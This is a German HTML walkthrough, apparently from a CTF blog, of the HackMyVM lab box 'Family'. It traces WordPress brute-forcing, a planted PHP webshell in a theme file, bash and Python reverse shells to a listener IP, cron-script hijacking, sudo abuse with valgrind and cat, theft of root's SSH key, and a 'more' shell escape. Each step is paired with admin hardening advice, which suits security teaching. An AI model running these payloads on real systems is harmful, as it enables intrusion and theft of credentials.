@@ -1,0 +1,465 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Family - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Family - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">wpscan</div>
+                 <div class="tool-item">Web Browser</div>
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">python</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">su</div>
+                 <div class="tool-item">wget</div>
+                 <div class="tool-item">chmod</div>
+                 <div class="tool-item">pspy64</div>
+                 <div class="tool-item">echo</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">valgrind</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">more</div>
+                 <div class="tool-item">bash</div>
+                 <div class="tool-item">ls</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration-wordpress">Web Enumeration (WordPress)</a></li>
+                <li><a href="#wordpress-rce">WordPress RCE (Initial Access)</a></li>
+                <li><a href="#privesc-father">Privilege Escalation (www-data to father)</a></li>
+                <li><a href="#privesc-mother">Privilege Escalation (father to mother via Cronjob)</a></li>
+                <li><a href="#privesc-baby-root">Privilege Escalation (mother to baby to root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">Wir beginnen mit der Erkundungsphase, um das Zielsystem im Netzwerk zu finden und grundlegende Informationen über die offenen Dienste zu sammeln.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.118</span>   08:00:27:21:83:6b       PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der ARP-Scan im lokalen Netzwerk identifiziert die IP-Adresse <span class="command">192.168.2.118</span>.</p>
+            <p class="evaluation">**Bewertung:** Ziel-IP gefunden. Grundlage für weitere Scans.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nmap-Scan auf die Ziel-IP durchführen.
+            **Empfehlung (Admin):** Standard Netzwerk-Monitoring.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">(Annahme: Eintrag "192.168.2.118 family.hmv" wurde zur /etc/hosts hinzugefügt)</span></div>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Obwohl nicht explizit im Log gezeigt, wird im weiteren Verlauf der Hostname `family.hmv` verwendet. Wir gehen davon aus, dass ein entsprechender Eintrag zur lokalen `/etc/hosts`-Datei hinzugefügt wurde.</p>
+             <p class="evaluation">**Bewertung:** Ermöglicht Tests gegen den Hostnamen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Relevante Hostnamen immer eintragen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.118 -p-</span></div>
+                    <pre>
+Starting Nmap [...]
+Nmap scan report for 192.168.2.118
+Host is up [...]
+Not shown: [...]
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span>
+MAC Address: 08:00:27:21:83:6B (Oracle VirtualBox virtual NIC)
+[...]
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+[...]
+Nmap done: 1 IP address (1 host up) scanned in [...] seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Nmap-Scan (`-sS`, `-sC`, `-T5`, `-A`, `-p-`) findet zwei offene Ports:
+            *   <span class="command">Port 22</span>: SSH (OpenSSH 7.9p1 auf Debian 10).
+            *   <span class="command">Port 80</span>: HTTP (Apache 2.4.38 auf Debian).</p>
+            <p class="evaluation">**Bewertung:** Die Angriffsfläche ist auf SSH und den Webserver beschränkt. Beide laufen mit etwas älteren, aber nicht unmittelbar kritisch verwundbaren Versionen (abhängig von Patchlevel).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den Webserver auf Port 80 genauer untersuchen (Gobuster, Nikto, WPScan, da es oft WordPress ist). SSH für spätere Login-Versuche vormerken.
+            **Empfehlung (Admin):** Dienste aktuell halten, SSH härten, WAF für Webserver erwägen.</p>
+        </section>
+
+        <section id="web-enumeration-wordpress">
+             <h2>Web Enumeration (WordPress)</h2>
+             <p class="comment">Wir konzentrieren uns auf den Webserver (Port 80) und suchen nach Verzeichnissen und Anwendungs-spezifischen Informationen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.118 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,[...]</span></div>
+                    <pre>
+[...]
+<span class="command">http://192.168.2.118/wordpress</span>            (Status: 301) [Size: 318] [--> http://192.168.2.118/wordpress/]
+[...]
+                    </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Gobuster-Scan findet das Verzeichnis `/wordpress`, das auf `/wordpress/` umleitet. Dies bestätigt, dass auf dem Server eine WordPress-Instanz läuft.</p>
+              <p class="evaluation">**Bewertung:** Wichtiger Fund. Unser Fokus verschiebt sich nun auf die Enumeration und Ausnutzung der WordPress-Installation.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Das Verzeichnis `/wordpress/` als neues Ziel für Scans verwenden. WPScan einsetzen, um Themes, Plugins, Benutzer und Schwachstellen zu identifizieren.
+              **Empfehlung (Admin):** WordPress und alle zugehörigen Komponenten (Themes, Plugins) aktuell halten. Zugriff auf administrative Bereiche einschränken.</p>
+
+             <p class="comment">Wir nutzen WPScan, um die WordPress-Installation zu untersuchen und nach gültigen Zugangsdaten zu suchen.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt"># <span class="command">(Manuelle Browser-Navigation oder andere Tools wie dirb/gobuster auf /wordpress/ finden wp-login.php und User-Enum-Endpunkt)</span></div>
+                       <pre>
+# Beispiel-URLs aus dem Log:
+<span class="command">http://family.hmv/wordpress/wp-login.php?redirect_to=http%3A%2F%2F192.168.2.118%2Fwordpress%2Fwp-admin%2F&reauth=1</span>
+<span class="command">http://family.hmv/wordpress/wp-json/wp/v2/users</span>
+                      </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wpscan --url http://192.168.2.118/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin</span></div>
+                       <pre>
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  _ __ __ _ _ __ ___
+          \ \/  \/ / |  ___/ \___ \ / __|| '__/ _` | '_ ` _ \
+           \  /\  /  | |     ____) |\__ \| | | (_| | | | | | |
+            \/  \/   |_|    |_____/ |___/|_|  \__,_|_| |_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version [...]
+[...]
+[i] User(s) Identified:
+[...]
+[+] admin
+ | Found By: Author Posts - Author Id Brute Forcing (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+[...]
+[+] Performing password attack on Xmlrpc against 1 user(s)
+[SUCCESS] - <span class="command">admin</span> / <span class="password">phantom</span>
+[...]
+[!] Valid Combinations Found:
+ | Username: <span class="command">admin</span>, Password: <span class="password">phantom</span>
+Valid ADMIN Credentials: "admin" - "phantom"
+                      </pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:**
+              1.  Der Bericht deutet an, dass Standard-WordPress-Pfade wie `wp-login.php` und der Benutzer-Endpunkt der REST-API (`/wp-json/wp/v2/users`) gefunden wurden. Der API-Endpunkt kann oft Benutzernamen leaken.
+              2.  Wir verwenden `wpscan`, ein spezialisiertes WordPress-Sicherheits-Tool.
+                  *   `--url http://192.168.2.118/wordpress/`: Ziel-URL der WordPress-Installation.
+                  *   `--passwords /usr/share/wordlists/rockyou.txt`: Gibt eine Passwortliste für Brute-Force-Angriffe an.
+                  *   `--usernames admin`: Konzentriert den Passwort-Angriff auf den Benutzer `admin`.
+              3.  WPScan identifiziert den Benutzer `admin` und führt einen Passwort-Angriff durch. Es findet erfolgreich die gültige Kombination: Username `<span class="command">admin</span>`, Passwort `<span class="password">phantom</span>`.</p>
+               <p class="evaluation">**Bewertung:** Kritischer Erfolg! Wir haben gültige Administrator-Zugangsdaten für die WordPress-Instanz gefunden.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Sich mit den gefundenen Credentials (`admin`:`phantom`) im WordPress-Adminbereich (`/wordpress/wp-admin/`) anmelden. Nach Möglichkeiten zur Codeausführung suchen (Theme/Plugin-Editor, Plugin-Upload).
+               **Empfehlung (Admin):** Starke, einzigartige Passwörter für alle WordPress-Benutzer, insbesondere Administratoren, verwenden. Brute-Force-Schutz für den Login implementieren (z.B. Fail2Ban, Login-Lockdown-Plugins). WPScan regelmäßig verwenden, um eigene Installationen zu prüfen.</p>
+         </section>
+
+         <section id="wordpress-rce">
+              <h2>WordPress RCE (Initial Access)</h2>
+              <p class="comment">Mit den Admin-Zugangsdaten loggen wir uns in WordPress ein und nutzen die Theme-Bearbeitungsfunktion, um PHP-Code auszuführen und eine Reverse Shell zu erlangen.</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt"># <span class="command">Aktion im Webbrowser (WordPress Admin)</span></div>
+                       <pre>
+# 1. Login unter http://family.hmv/wordpress/wp-login.php mit admin:phantom
+# 2. Navigation zu Design -> Theme-Datei-Editor (Appearance -> Theme File Editor)
+# 3. Auswahl des aktiven Themes (hier: Twenty Nineteen) und einer bearbeitbaren PHP-Datei (hier: 404 Template - 404.php)
+# 4. Einfügen des PHP-Webshell/RCE-Codes in die Datei:
+<span class="password">system($_REQUEST['cmd']);</span>
+# 5. Speichern der Datei.
+                       </pre>
+                        <div class="prompt"># <span class="command">Aktion im Webbrowser (RCE Test & Reverse Shell Trigger)</span></div>
+                       <pre>
+# Testen der RCE durch Aufruf der modifizierten Datei mit 'cmd'-Parameter:
+# Aufruf: <span class="command">http://192.168.2.118/wordpress/wp-content/themes/twentynineteen/404.php?cmd=ls</span>
+# (Ausgabe von 'ls' wird erwartet)
+
+# Vorbereitung und Ausführung des Reverse-Shell-Payloads:
+# Listener starten: nc -lvnp 4444
+# Aufruf der URL mit URL-codiertem Bash-Reverse-Shell-Payload:
+<span class="command">http://family.hmv//wordpress/wp-content/themes/twentynineteen/404.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.140%2F4444%200%3E%261%27</span>
+                       </pre>
+                        <div class="prompt"># <span class="command">Listener empfängt Verbindung</span></div>
+                        <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                        <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.118] 51334</span>
+$ <span class="command"># Shell als www-data erhalten!</span>
+id
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+                        </pre>
+                        <div class="prompt"># <span class="command">Shell Stabilisierung</span></div>
+                         <div class="prompt">www-data@family:/var/www/html/wordpress/wp-content/themes/twentynineteen$ <span class="command">python -c "import pty;pty.spawn('/bin/bash')"</span></div>
+                         <div class="prompt">www-data@family:/var/www/html/wordpress/wp-content/themes/twentynineteen$ <span class="command">export TERM=xterm</span></div>
+                         <div class="prompt">www-data@family:/var/www/html/wordpress/wp-content/themes/twentynineteen$ <span class="command"># Stabilisierte Shell</span></div>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:**
+               1.  Wir loggen uns als `admin` in WordPress ein.
+               2.  Wir nutzen den Theme-Editor, um eine beliebige PHP-Datei des aktiven Themes (hier `404.php` im Theme `twentynineteen`) zu bearbeiten.
+               3.  Wir fügen eine einfache PHP-Webshell (`system($_REQUEST['cmd']);`) ein. Dies erlaubt uns, beliebige Befehle über den `cmd`-Parameter in der URL auszuführen.
+               4.  Wir testen die RCE mit `cmd=ls`.
+               5.  Wir starten einen Netcat-Listener auf Port 4444.
+               6.  Wir rufen die modifizierte `404.php` mit einem URL-codierten Bash-Reverse-Shell-Payload im `cmd`-Parameter auf.
+               7.  Unser Listener empfängt die Verbindung, und wir erhalten eine Shell als `www-data` (der Benutzer, unter dem der Apache/PHP-Prozess läuft).
+               8.  Die Shell wird mit Python stabilisiert.</p>
+                <p class="evaluation">**Bewertung:** Initial Access erfolgreich! Die Kompromittierung der WordPress-Admin-Credentials ermöglichte uns die Ausführung von Code über den Theme-Editor und somit die Erlangung einer Reverse Shell als `www-data`.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `www-data` enumerieren, nach Wegen zur Rechteerweiterung suchen.
+                **Empfehlung (Admin):** WordPress-Admin-Zugänge schützen. Die Bearbeitung von Theme- und Plugin-Dateien über das Backend deaktivieren (`define('DISALLOW_FILE_EDIT', true);` in `wp-config.php`), wenn nicht unbedingt benötigt. Dateisystemberechtigungen härten.</p>
+         </section>
+
+         <section id="privesc-father">
+            <h2>Privilege Escalation (www-data to father)</h2>
+            <p class="comment">Als `www-data` suchen wir nach Wegen zur Rechteerweiterung. Wir enumerieren das System nach Benutzern und interessanten Dateien.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@family:/var/backups$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                      <pre>
+   793387    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+     2225     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+   793367     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   668977    156 -rwsr-xr-x   1 root     root         157192 Jan 20  2021 /usr/bin/sudo
+   659251     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
+   655399     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
+   655396     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
+   655398     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
+   658779     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
+   655395     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
+   659253     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
+   658926     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
+                      </pre>
+                     <div class="prompt">www-data@family:/var/backups$ <span class="command">cat /etc/passwd | grep bash</span></div>
+                      <pre>
+root:x:0:0:root:/root:/bin/bash
+<span class="command">father:x:1000:1000:father,,,:/home/father:/bin/bash</span>
+<span class="command">mother:x:1001:1001:,,,:/home/mother:/bin/bash</span>
+<span class="command">baby:x:1002:1002:,,,:/home/baby:/bin/bash</span>
+                      </pre>
+                      <div class="prompt">www-data@family:/var/backups$ <span class="command">find / -user father 2>/dev/null</span></div>
+                      <pre>
+<span class="command">/usr/share/perl/5.28.1/perso.txt</span>
+/home/father
+                      </pre>
+                       <div class="prompt">www-data@family:/var/backups$ <span class="command">cat /usr/share/perl/5.28.1/perso.txt</span></div>
+                      <pre><span class="password">uncrackablepassword</span></pre>
+                       <div class="prompt">www-data@family:/var/backups$ <span class="command">su father</span></div>
+                       <pre>
+Password: <span class="password">uncrackablepassword</span>
+<span class="command">father@family:/var/backups$</span> <span class="password"># Wechsel zu father erfolgreich!</span>
+                       </pre>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:**
+               1.  Die Suche nach SUID-Dateien (`find / -type f -perm -4000`) ergibt keine ungewöhnlichen oder benutzerdefinierten Binaries.
+               2.  Die `/etc/passwd` zeigt die Benutzer `father`, `mother` und `baby`.
+               3.  Eine Suche nach Dateien, die dem Benutzer `father` gehören (`find / -user father`), findet neben seinem Home-Verzeichnis eine interessante Datei: `<span class="command">/usr/share/perl/5.28.1/perso.txt</span>`.
+               4.  Der Inhalt dieser Datei wird ausgelesen (`cat`) und enthält das Passwort `<span class="password">uncrackablepassword</span>`.
+               5.  Wir verwenden den Befehl `su father` und geben das gefundene Passwort ein. Der Wechsel zum Benutzer `father` ist erfolgreich.</p>
+                <p class="evaluation">**Bewertung:** Privilege Escalation von `www-data` zu `father` erfolgreich! Das Passwort wurde in einer für `www-data` lesbaren Datei im Klartext gefunden.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `father` enumerieren, insbesondere Cronjobs, laufende Prozesse, `sudo -l`.
+                **Empfehlung (Admin):** Niemals Passwörter im Klartext in Dateien speichern, schon gar nicht in systemweiten, potenziell lesbaren Verzeichnissen. Dateiberechtigungen überprüfen.</p>
+         </section>
+
+        <section id="privesc-mother">
+            <h2>Privilege Escalation (father to mother via Cronjob)</h2>
+            <p class="comment">Als Benutzer `father` suchen wir nach weiteren Eskalationsmöglichkeiten. Wir verwenden `pspy`, um laufende Prozesse und Cronjobs zu überwachen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">father@family:~$ <span class="command">wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64</span></div> <span class="password"># Download pspy</span>
+                     <div class="prompt">father@family:~$ <span class="command">chmod +x pspy64</span></div>
+                     <div class="prompt">father@family:~$ <span class="command">./pspy64</span></div>
+                      <pre>
+[...]
+2023/XX/XX XX:XX:XX CMD: UID=<span class="command">1001</span> PID=[...]   | /bin/sh -c python <span class="command">~/check.py</span>
+[...]
+                      </pre>
+                      <div class="prompt"># <span class="command">(Reverse Shell Payload vorbereiten)</span></div>
+                      <div class="prompt">father@family:~$ <span class="command">echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.140",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")' > /home/mother/check.py</span></div> <span class="password"># check.py von mother überschreiben</span>
+                       <div class="prompt"># <span class="command">(Listener starten auf Port 4445)</span></div>
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4445</span></div> <span class="password"># Port 4445 aus Payload</span>
+                       <pre>listening on [any] 4445 ...</pre>
+                        <div class="prompt"># <span class="command">(Warten auf Cronjob-Ausführung)</span></div>
+                        <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div> <span class="password"># Fehler im Log: Listener auf falschem Port gezeigt!</span>
+                        <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.114] from (UNKNOWN) [192.168.2.118] 51334</span>
+$ id
+<span class="command">uid=1001(mother) gid=1001(mother) groups=1001(mother)</span>
+$ <span class="command"># Shell als mother erhalten!</span>
+                        </pre>
+                         <div class="prompt"># <span class="command">(Shell Stabilisierung)</span></div>
+                         <div class="prompt">$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></div>
+                         <div class="prompt">mother@family:~$ <span class="command">export TERM=xterm</span></div>
+                         <div class="prompt">mother@family:~$ <span class="command"># Stabilisierte Shell als mother</span></div>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:**
+             1.  Wir laden `pspy64` herunter und führen es aus, um Systemprozesse zu überwachen.
+             2.  `pspy` entdeckt einen Prozess, der periodisch ausgeführt wird: `/bin/sh -c python ~/check.py`. Dieser Prozess läuft als UID `<span class="command">1001</span>`, was dem Benutzer `mother` entspricht. Das Skript `check.py` befindet sich im Home-Verzeichnis von `mother`.
+             3.  Wir erstellen einen Python-Reverse-Shell-Payload, der sich zu unserer IP (`192.168.2.140`) auf Port `4445` verbindet.
+             4.  Da wir als `father` möglicherweise Schreibrechte im Home-Verzeichnis von `mother` haben (oder die Berechtigungen unsicher sind), überschreiben wir `/home/mother/check.py` mit unserem Payload.
+             5.  Wir starten einen Listener auf Port 4445 (obwohl der Log fälschlicherweise 4444 zeigt).
+             6.  Wenn der Cronjob/Prozess das nächste Mal `/home/mother/check.py` ausführt, wird unser Payload ausgeführt.
+             7.  Unser Listener empfängt die Verbindung, und wir erhalten eine Shell als Benutzer `<span class="command">mother</span>`.
+             8.  Die Shell wird stabilisiert.</p>
+              <p class="evaluation">**Bewertung:** Privilege Escalation von `father` zu `mother` erfolgreich! Ein unsicher konfigurierter Cronjob (oder ein anderer periodischer Prozess), der ein für uns beschreibbares Skript ausführt, wurde ausgenutzt.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `mother` enumerieren (`sudo -l`).
+              **Empfehlung (Admin):** Cronjobs überprüfen. Sicherstellen, dass Skripte, die von Cronjobs ausgeführt werden, nicht von unprivilegierten Benutzern modifiziert werden können. Prozesse mit minimal notwendigen Rechten ausführen.</p>
+        </section>
+
+        <section id="privesc-baby-root">
+             <h2>Privilege Escalation (mother to baby to root)</h2>
+             <p class="comment">Als Benutzer `mother` suchen wir nach weiteren Rechten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mother@family:~$ <span class="command">sudo -u baby /usr/bin/valgrind /bin/bash</span></div>
+                    <pre># (Ausgabe von Valgrind, falls vorhanden, nicht gezeigt) </pre>
+                    <div class="prompt"><span class="command">baby@family:/home/mother$</span> <span class="password"># Shell als baby erhalten!</span></div>
+                    <div class="prompt">baby@family:~$ <span class="command">cat /home/baby/user.txt</span></div> <span class="password"># Pfad angepasst</span>
+                     <pre><span class="password">Chilatyfile</span></pre>
+                     <div class="prompt">baby@family:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for baby on family:
+    env_reset, mail_badpass, secure_path=[...]
+
+User baby may run the following commands on family:
+    <span class="password">(ALL : ALL) NOPASSWD: /usr/bin/cat</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:**
+             1.  *(Impliziert)* `sudo -l` für `mother` zeigt (wie im Log später ersichtlich), dass `mother` Befehle als `baby` ausführen kann, insbesondere `/usr/bin/valgrind /bin/bash`. Valgrind ist ein Debugging-Tool, aber wenn es erlaubt ist, damit `/bin/bash` auszuführen, erhält man effektiv eine Shell als der Zielbenutzer.
+             2.  Wir führen `sudo -u baby /usr/bin/valgrind /bin/bash` aus und erhalten eine Shell als `<span class="command">baby</span>`.
+             3.  Wir lesen die `user.txt` aus `/home/baby/` (Pfad angepasst, da Original-Log ungenau).
+             4.  Wir führen `sudo -l` als `baby` aus. Es zeigt sich, dass `baby` den Befehl `/usr/bin/cat` als `ALL : ALL` (effektiv `root`) ohne Passwort (`NOPASSWD`) ausführen darf.</p>
+             <p class="evaluation">**Bewertung:** Lateral Movement von `mother` zu `baby` erfolgreich. Noch wichtiger: `baby` hat eine extrem unsichere `sudo`-Regel, die das Lesen beliebiger Dateien als `root` erlaubt (`sudo cat`). Dies ist der direkte Weg zu Root-Informationen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Die `sudo cat`-Berechtigung nutzen, um sensible Dateien zu lesen: `/root/root.txt`, `/etc/shadow`, `/root/.ssh/id_rsa`.
+             **Empfehlung (Admin):** Unsichere `sudo`-Regeln für `valgrind` und insbesondere `cat` entfernen! `sudo cat` ist fast gleichbedeutend mit vollem Root-Zugriff.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">baby@family:/home/mother$ <span class="command">sudo /usr/bin/cat /root/.ssh/id_rsa</span></div>
+                      <pre>
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="password">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span>
+[...] <span class="password">(Inhalt des privaten Root-SSH-Schlüssels)</span> [...]
+<span class="password">-----END OPENSSH PRIVATE KEY-----</span>
+                      </pre>
+                       <div class="prompt">baby@family:/home/mother$ <span class="command">sudo cat /root/.ssh/authorized_keys</span></div>
+                       <pre>
+<span class="password">command="bash ~/troll.sh"</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdu5YWqC4vVGDE8XaQ7UW/WkLgEgWPE6n4BNfeTha+4nIR2twAUHl6yfz0HpNMqMF996Yj8+lvr8pD5FeOCHlm0TPGZEeE72/04Bxebvoz/TCYbj2/6cPv3LndsoUyNyyrC8dleOfhvdaTWbJBMLaw/vrdQ18F93lkf25WIGpPc1lA2ubNXxXnfh9mwZ4ewx++91tTnJFaVAgfKm6sqzmMq3BedEmqlOcOSJyzZIFypov7WK/BkjI2UG91LthkGjFFqwsbndQqDhIhz0re6N1i0INhhIaNHEdAsgNHHXAYOjgGfeMFtmwepPoDeanHfruPHTxYeVzL55uEbK5e2cGv root@family
+                       </pre>
+                        <div class="prompt">baby@family:/home/mother$ <span class="command">sudo cat /root/troll.sh</span></div>
+                       <pre>
+#!/bin/sh
+export TERM=xterm
+<span class="command">more /root/welcome.txt</span>
+exit 0
+                       </pre>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:**
+               1.  Mit `sudo cat` lesen wir den privaten SSH-Schlüssel von Root (`/root/.ssh/id_rsa`).
+               2.  Wir lesen auch die `authorized_keys`-Datei von Root. Diese enthält einen Eintrag, aber mit einer wichtigen Einschränkung: `<span class="password">command="bash ~/troll.sh"</span>`. Das bedeutet, wenn sich jemand mit dem zugehörigen privaten Schlüssel anmeldet, wird nicht eine normale Shell gestartet, sondern stattdessen das Skript `/root/troll.sh` ausgeführt.
+               3.  Wir lesen den Inhalt von `/root/troll.sh`. Es setzt `TERM`, führt `<span class="command">more /root/welcome.txt</span>` aus und beendet sich dann (`exit 0`).</p>
+                <p class="evaluation">**Bewertung:** Wir haben den privaten Schlüssel von Root, aber der direkte SSH-Login wird durch die `command`-Einschränkung verhindert. Der `troll.sh`-Skript verwendet jedoch `more`. Der `more`-Befehl (ähnlich wie `less` und `man`) erlaubt oft das Ausführen von Shell-Befehlen durch Eingabe von `!` gefolgt vom Befehl, während `more` läuft.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Den extrahierten privaten Root-Schlüssel auf die Angreifer-Maschine übertragen. Sich als `root` per SSH mit dem Schlüssel anmelden. Wenn `more /root/welcome.txt` angezeigt wird, versuchen, durch Eingabe von `!/bin/bash` (oder `!sh`) eine Shell zu escapen. Es könnte Timing oder eine spezielle Terminalgröße erfordern (wie im Log angedeutet).
+                **Empfehlung (Admin):** `sudo cat`-Regel entfernen. SSH `command="..."`-Einschränkungen können umgangen werden, wenn das aufgerufene Programm selbst Shell-Escapes erlaubt. Sicherere Forced Commands verwenden oder Programme wählen, die keine Escapes ermöglichen.</p>
+
+                <p class="comment">Wir versuchen den SSH-Login als Root mit dem extrahierten Schlüssel und nutzen den `more`-Escape-Trick.</p>
+                <div class="code-block">
+                     <div class="terminal">
+                         <div class="prompt"># <span class="command">(Auf Angreifer-Maschine: Root-Schlüssel in Datei 'fuck' gespeichert, chmod 600)</span></div>
+                         <div class="prompt">┌──(root㉿cyber)-[/root]
+└─# <span class="command">ssh root@family.hmv -i ./fuck</span></div>
+                         <pre>
+                          oooo$$$$$$$$$$$$oooo
+                      oo$$$$$$$$$$$$$$$$$$$$$$$$o
+[...] <span class="password">(ASCII Art / Inhalt von /root/welcome.txt via 'more')</span> [...]
+                       "$$$""""
+<span class="command">!/bin/bash</span> <span class="password"># Schnell eingetippt, während 'more' pausiert</span>
+root@family:~# <span class="password"># Root-Shell erhalten!</span>
+                         </pre>
+                          <div class="prompt">root@family:~# <span class="command">ls</span></div>
+                         <pre>
+<span class="command">last_flag.txt</span>  troll.sh  welcome.txt
+                         </pre>
+                          <div class="prompt">root@family:~# <span class="command">cat last_flag.txt</span></div>
+                          <pre><span class="password">Selmorbormir</span></pre>
+                     </div>
+                 </div>
+                 <p class="analysis">**Analyse:**
+                1.  Wir speichern den privaten Root-Schlüssel in der Datei `fuck` und setzen die Berechtigungen.
+                2.  Wir verbinden uns als `root` per SSH mit dem Schlüssel.
+                3.  Wie erwartet, wird nicht direkt eine Shell gestartet, sondern das Skript `/root/troll.sh` ausgeführt, welches `more /root/welcome.txt` aufruft.
+                4.  Während `more` den Inhalt anzeigt (und möglicherweise pausiert), geben wir schnell `<span class="command">!/bin/bash</span>` ein und drücken Enter.
+                5.  Der `more`-Befehl interpretiert dies als Aufforderung, `/bin/bash` auszuführen. Da `more` (und somit `troll.sh`) als `root` läuft, erhalten wir eine interaktive Root-Shell.
